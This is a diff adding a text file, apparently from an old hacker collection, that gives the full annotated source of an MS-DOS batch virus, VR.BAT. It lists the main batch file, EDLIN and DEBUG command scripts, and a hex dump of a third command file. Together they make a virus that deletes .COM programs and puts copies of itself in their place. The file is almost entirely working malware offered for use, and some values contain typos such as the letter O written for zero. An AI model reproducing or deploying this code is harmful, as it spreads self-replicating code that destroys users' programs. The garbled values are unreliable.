@@ -1,0 +1,74 @@
+[2.7]
+
+                            Batch Viruses
+                            -------------
+
+
+Whoever thought that viruses could be in BATCH file.This virus which we        
+
+are about to see makes use of MS-DOS operating system. This BATCH virus
+uses DEBUG & EDLIN programs.
+
+Name: VR.BAT
+
+echo = off         ( Self explanatory)
+ctty nul           ( This is important. Console output is turned off)
+path c:\msdos      ( May differ on other systems )
+dir *.com/w>ind    ( The directory is written on "ind" ONLY name entries)      
+
+edlin ind<1        ( "Ind" is processed with EDLIN so only file names appear)
+debug ind<2        ( New batch program is created with debug)
+edlin name.bat<3   ( This batch goes to an executable form because of EDLIN)
+ctty con           ( Console interface is again assigned)
+name               ( Newly created NAME.BAT is called.
+
+
+In addition to file to this Batch file,there command files,here named 1,2,3
+
+Here is the first command file:
+-------------------------------
+Name: 1
+
+1,4d               ( Here line 1-4 of the "IND" file are deleted )
+e                  ( Save file )
+
+Here is the second command file:
+--------------------------------
+Name: 2
+
+m100,10b,f000      (First program name is moved to the F000H address to save)  
+
+e108 ".BAT"        (Extention of file name is changed to .BAT)
+m100,10b,f010      (File is saved again)
+e100"DEL "         (DEL command is written to address 100H)
+mf000,f00b,104     (Original file is written after this command)
+e10c 2e            (Period is placed in from of extension)
+e110 0d,0a         (Carrige return+ line feed)
+mf010,f020,11f     ( Modified file is moved to 11FH address from buffer area)
+e112 "COPY \VR.BAT" ( COPY command is now placed in front of file)
+e12b od,0a         (COPY command terminated with carriage return + lf)
+rxc                ( The CX register is ... )
+2c                 ( set to 2CH)
+nname.bat          ( Name it NAME.BAT)
+w                  ( Write )
+q                  ( quit )
+
+
+The third command file must be printed as a hex dump because it contains
+2 control characters (1Ah=Control Z) and this is not entirely printable.
+
+Hex dump of the third command file:
+-----------------------------------
+Name: 3
+
+0100   31 2C 31 3F 52 20 1A 0D-6E 79 79 79 79 79 79 79 
+       1  ,  1  ?        .  .  n  y  y  y  y  y  y  y
+0110   79 29 0D 32 2C 32 3F 52-20 1A OD 6E 6E 79 79 79
+       y     .  2  ,  ?  ?  r     .  .  n  n  y  y  y
+0120   79 79 79 79 29 0D 45 0D-00 00 00 00 00 00 00 00
+       y  y  y  y     .  E  .  .  .  .  .  .  .  .  .
+
+
+In order for this virus to work VR.BAT should be in the root. This program
+only affects .COM files.
+
